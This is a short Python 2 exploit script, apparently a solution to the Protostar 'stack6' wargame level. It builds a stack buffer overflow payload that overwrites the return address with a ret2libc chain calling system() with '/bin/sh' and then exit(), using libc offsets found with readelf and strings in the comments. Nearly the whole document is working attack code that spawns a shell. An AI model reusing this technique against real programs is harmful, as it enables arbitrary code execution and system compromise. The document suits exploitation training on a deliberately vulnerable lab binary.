#!/usr/bin/python

import struct

buff = "A"*72
esp = "DDDD" # Probabily Paddings also
ebp = "BBBB" 
eip = "CCCC"

# root@protostar:/opt/protostar# readelf -s "/lib/libc-2.11.2.so" | grep "system"
#   238: 000f29d0    66 FUNC    GLOBAL DEFAULT   12 svcerr_systemerr@@GLIBC_2.0
#   606: 00038fb0   125 FUNC    GLOBAL DEFAULT   12 __libc_system@@GLIBC_PRIVATE
#  1399: 00038fb0   125 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0



libc_addr = 0xb7e97000                    # Libc Address

system_call = libc_addr + 0x38fb0  #  

#  readelf -s "/lib/libc-2.11.2.so" | grep "exit"
exit_call   = libc_addr + 0x2f0c0  #

# strings -a -t x "/lib/libc-2.11.2.so" | grep "/bin/sh"

binsh_addr  = libc_addr + 0x11f3bf         # 



eip = struct.pack("I", system_call)


payload = buff + esp + ebp + eip + struct.pack("I", exit_call) + struct.pack('I', binsh_addr)


# root@protostar:/opt/protostar# (cat tmp; cat)|./bin/stack6

print payload

